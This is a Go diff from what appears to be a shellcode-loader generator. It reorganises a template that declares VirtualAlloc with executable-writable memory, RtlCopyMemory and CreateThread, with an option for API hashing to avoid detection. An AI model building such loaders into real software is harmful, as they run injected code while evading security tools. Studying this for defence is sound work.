@@ -35,6 +35,29 @@ import (
 }
 
 func (t CreateTTemplate) Const() string {
+	if !t.UseApiHashing {
+
+		return fmt.Sprintf(`
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+	kernel32        = syscall.MustLoadDLL("kernel32.dll")
+	ntdll           = syscall.MustLoadDLL("ntdll.dll")
+
+    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
+	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
+	CreateThread        = kernel32.MustFindProc("CreateThread")
+
+    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
+)
+        `)
+
+	}
+
 	return fmt.Sprintf(`
 const (
 	MEM_COMMIT             = 0x1000
@@ -47,23 +70,7 @@ const (
 }
 
 func (t CreateTTemplate) Init() string {
-
-	if t.UseApiHashing {
-		return fmt.Sprintf("\n")
-	}
-
-	return fmt.Sprintf(`
-var (
-	kernel32        = syscall.MustLoadDLL("kernel32.dll")
-	ntdll           = syscall.MustLoadDLL("ntdll.dll")
-
-    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
-	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
-	CreateThread        = kernel32.MustFindProc("CreateThread")
-
-    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
-)
-    `)
+	return fmt.Sprintf("\n")
 }
 
 func (t CreateTTemplate) Process() string {
